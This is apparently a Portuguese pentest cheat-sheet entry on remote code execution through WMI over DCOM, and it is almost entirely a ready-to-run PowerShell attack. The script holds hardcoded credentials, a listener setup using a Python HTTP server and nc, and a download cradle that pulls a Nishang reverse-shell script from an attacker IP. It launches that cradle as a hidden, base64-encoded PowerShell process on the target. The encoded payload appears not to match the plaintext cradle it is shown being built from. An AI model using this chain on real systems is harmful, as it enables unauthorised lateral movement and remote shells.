---
title: "WMI Exec"
---

# WMI Exec

Execução remota de código via sessão WMI com PSCredential. Permite criar processos em hosts remotos sem usar SMB ou WinRM, usando o protocolo DCOM, o que reduz ruído em alguns ambientes.

```powershell
# Credenciais
$username = 'jen'
$password = 'Nexus123!'
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString

# Sessão WMI via DCOM
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.234.72 -Credential $credential -SessionOption $options

# Iniciar servidor HTTP e listener
# python3 -m http.server 80
# nc -vnlp 443

# Encodar payload
pwsh
$Text = "iex(new-object net.webclient).downloadstring('http://192.168.45.156/nishangol.ps1')"
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
$EncodedText
exit

# Executar processo no alvo via WMI
$Command = 'powershell -nop -w hidden -e aQBlAHgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADYANwAuADUANwAuADIAMQA4AC8AdgBhAGMAYQAuAHAAcwAxACcAKQA='
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = $Command}
```
